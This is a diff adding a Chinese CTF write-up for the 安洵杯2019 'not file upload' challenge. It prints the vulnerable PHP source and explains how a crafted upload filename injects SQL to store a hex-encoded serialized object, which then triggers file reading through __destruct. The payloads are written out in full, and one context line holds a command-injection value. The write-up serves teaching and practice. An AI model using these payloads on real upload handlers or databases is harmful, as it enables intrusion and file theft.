@@ -6898,3 +6898,281 @@ file "";head /fla*;"" ;
     访问`/favicon/shell.php`
 
     使用蚁剑的时候老是提示返回数据为空，但是在Firefox中可以用hackbar插件直接post方式执行命令也可以拿到flag
+
+## 安洵杯2019 不是文件上传(文件上传+sql注入)
+
+1. 信息收集
+
+   首页网页源码提示了后台源码在github上，网页上有个版权信息，通过版权信息中的用户名在github上可以找到源码。
+
+    helper.php
+
+    ```php
+    <?php
+    class helper {
+        protected $folder = "pic/";
+        protected $ifview = False;
+        protected $config = "/flag";
+        // The function is not yet perfect, it is not open yet.
+
+        public function upload($input="file")
+        {
+            $fileinfo = $this->getfile($input);
+            $array = array();
+            $array["title"] = $fileinfo['title'];
+            $array["filename"] = $fileinfo['filename'];
+            $array["ext"] = $fileinfo['ext'];
+            $array["path"] = $fileinfo['path'];
+            $img_ext = getimagesize($_FILES[$input]["tmp_name"]);
+            $my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
+            $array["attr"] = serialize($my_ext);
+            $id = $this->save($array);
+            if ($id == 0){
+                die("Something wrong!");
+            }
+            echo "<br>";
+            echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
+        }
+
+        public function getfile($input)
+        {
+            if(isset($input)){
+                $rs = $this->check($_FILES[$input]);
+            }
+            return $rs;
+        }
+
+        public function check($info)
+        {
+            $basename = substr(md5(time().uniqid()),9,16);
+            $filename = $info["name"];
+            $ext = substr(strrchr($filename, '.'), 1);
+            $cate_exts = array("jpg","gif","png","jpeg");
+            if(!in_array($ext,$cate_exts)){
+                die("<p>Please upload the correct image file!!!</p>");
+            }
+            $title = str_replace(".".$ext,'',$filename);
+            return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
+        }
+
+        public function save($data)
+        {
+            if(!$data || !is_array($data)){
+                die("Something wrong!");
+            }
+            $id = $this->insert_array($data);
+            return $id;
+        }
+
+        public function insert_array($data)
+        {
+            $con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
+            if (mysqli_connect_errno($con))
+            {
+                die("Connect MySQL Fail:".mysqli_connect_error());
+            }
+            $sql_fields = array();
+            $sql_val = array();
+            foreach($data as $key=>$value){
+                $key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
+                $value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
+                $sql_fields[] = "`".$key_temp."`";
+                $sql_val[] = "'".$value_temp."'";
+            }
+            $sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
+            mysqli_query($con, $sql);
+            $id = mysqli_insert_id($con);
+            mysqli_close($con);
+            return $id;
+        }
+
+        public function view_files($path){
+            if ($this->ifview == False){
+                return False;
+                //The function is not yet perfect, it is not open yet.
+            }
+            $content = file_get_contents($path);
+            echo $content;
+        }
+
+        function __destruct(){
+            # Read some config html
+            $this->view_files($this->config);
+        }
+    }
+    ?>
+    ```
+
+    show.php
+    ```php
+    <?php
+    include("./helper.php");
+    $show = new show();
+    if($_GET["delete_all"]){
+        if($_GET["delete_all"] == "true"){
+            $show->Delete_All_Images();
+        }
+    }
+    $show->Get_All_Images();
+
+    class show{
+        public $con;
+
+        public function __construct(){
+            $this->con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
+            if (mysqli_connect_errno($this->con)){
+                die("Connect MySQL Fail:".mysqli_connect_error());
+            }
+        }
+
+        public function Get_All_Images(){
+            $sql = "SELECT * FROM images";
+            $result = mysqli_query($this->con, $sql);
+            if ($result->num_rows > 0){
+                while($row = $result->fetch_assoc()){
+                    if($row["attr"]){
+                        $attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]);
+                        $attr = unserialize($attr_temp);
+                    }
+                    echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
+                }
+            }else{
+                echo "<p>You have not uploaded an image yet.</p>";
+            }
+            mysqli_close($this->con);
+        }
+
+        public function Delete_All_Images(){
+            $sql = "DELETE FROM images";
+            $result = mysqli_query($this->con, $sql);
+        }
+    }
+    ```
+
+2. 解题过程
+
+    通过分析 `helper.php` 会发现两个很明显的函数，
+
+    ```php
+    public function view_files($path){
+        if ($this->ifview == False){
+            return False;
+            //The function is not yet perfect, it is not open yet.
+        }
+        $content = file_get_contents($path);
+        echo $content;
+    }
+
+    function __destruct(){
+        # Read some config html
+        $this->view_files($this->config);
+    }
+    ```
+    `__destruct` 函数会调用 `view_files`函数，然后 `view_files` 函数会读取文件内容并显示出来。`__destruct`是魔术方法，对象销毁时会自动调用。
+
+    `__destruct` 传给 `view_files`函数的参数是对象自身属性`$htis->config`,所以我们可以向办法让属性config的值为`/flag`。从而达到读取flag的目的(*flag的文件的名称和路径是猜的，flag的路径一般就两个，当前目录下，或者根目录，名称没有提示就是flag*)
+
+    这样的话就要利用反序列化，show类中有个反序列化`$attr = unserialize($attr_temp);`,helper类中有个序列化`$array["attr"] = serialize($my_ext);`,下一步就是想办法把这个attr的值改成我们构造的payload,那么问题来了，这个参数的值我们没有办法直接修改。
+
+    接着往下看，调用了`save()`
+    ```php
+    public function save($data)
+    {
+        if(!$data || !is_array($data)){
+            die("Something wrong!");
+        }
+        $id = $this->insert_array($data);
+        return $id;
+    }
+    ```
+    `save()`首先判断传过来的参数是否为存在，且是否为数组，然后会调用`insert_array()`
+    ```php
+    public function insert_array($data)
+    {
+        $con = mysqli_connect("127.0.0.1","r00t","r00t","pic_base");
+        if (mysqli_connect_errno($con))
+        {
+            die("Connect MySQL Fail:".mysqli_connect_error());
+        }
+        $sql_fields = array();
+        $sql_val = array();
+        foreach($data as $key=>$value){
+            $key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
+            $value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
+            $sql_fields[] = "`".$key_temp."`";
+            $sql_val[] = "'".$value_temp."'";
+        }
+        $sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
+        mysqli_query($con, $sql);
+        $id = mysqli_insert_id($con);
+        mysqli_close($con);
+        return $id;
+    }
+    ```
+
+    这个函数的作用就是把数据存入数据库，但是在存之前，它会做一些处理。因为`helper`类中的属性是 `protected` 类型的,在序列化后会在属性名前添加`\0\0\0`(*'\0'表示空字符，ASCII值为0*), `insert_array`会把`\0\0\0`替换成 `chr(0).'*'.chr(0)`,然后它会把数组中的键值分别存入两个数组，一个存放键，一个存放值。最后一步处理是用`implode`函数将数组中的元素用`,`连接成字符串。处理完之后存入数组，没有做任何过滤。
+
+    payload1
+    ```php
+    <?php
+    class helper{
+        protected $ifview = true;
+        protected $config = "/flag";
+    }
+
+    $a = new helper();
+    echo serialize($a);
+    echo '<br>';
+    echo bin2hex(serialize($a));
+    ```
+    对于上面的替换可以采用16进制绕过，mysql数据库会自动将16进制转换成字符串。
+
+    payload1
+    ```
+    0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d
+    ```
+
+    我们可以构造一个payload，让后台执行以后sql语句变成 
+    ```sql
+    INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES ('x','x','x','x',payload1);#
+    ```
+
+    因为它利用了implode分割，我们正好可以利用这个函数。那么问题来了，我们要找到我们可以控制的参数。
+
+    在给数组赋值前调用了`getfile`函数
+    ```php
+    public function getfile($input)
+    {
+        if(isset($input)){
+            $rs = $this->check($_FILES[$input]);
+        }
+        return $rs;
+    }
+    ```
+    先检查input是否为空，然后调用`check`函数。
+
+    ```php
+    public function check($info)
+    {
+        $basename = substr(md5(time().uniqid()),9,16);
+        $filename = $info["name"];
+        $ext = substr(strrchr($filename, '.'), 1);
+        $cate_exts = array("jpg","gif","png","jpeg");
+        if(!in_array($ext,$cate_exts)){
+            die("<p>Please upload the correct image file!!!</p>");
+        }
+        $title = str_replace(".".$ext,'',$filename);
+        return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
+    }
+    ```
+    这个函数最后返回数组，观察里面的值，`'title'=>$title`,`$title`变量的值是`$filename`的值去掉后缀名得到的。filename就是我们上传文件的文件名。这个字段我们可以控制。再看其他参数，我们都没办法控制。所以我们就要通过控制文件名来传入我们的payload，然后利用反序列化读取文件。
+
+    payload2
+    ```php
+    filename=a','1','1','1',payload1);#.jpg
+    ```
+    implod分割数组元素是会加一对`''`,第一个参数需要闭合一下第一个 `'`,后面的因为我们用了`#`注释后面的内容，所以要在payload1后加一个`);`
+
+    因为后台会验证后缀名，所以也要加一下。
+
+    bp抓取上传文件的数据包，修改文件名为payload2，访问show.php就能拿到flag。
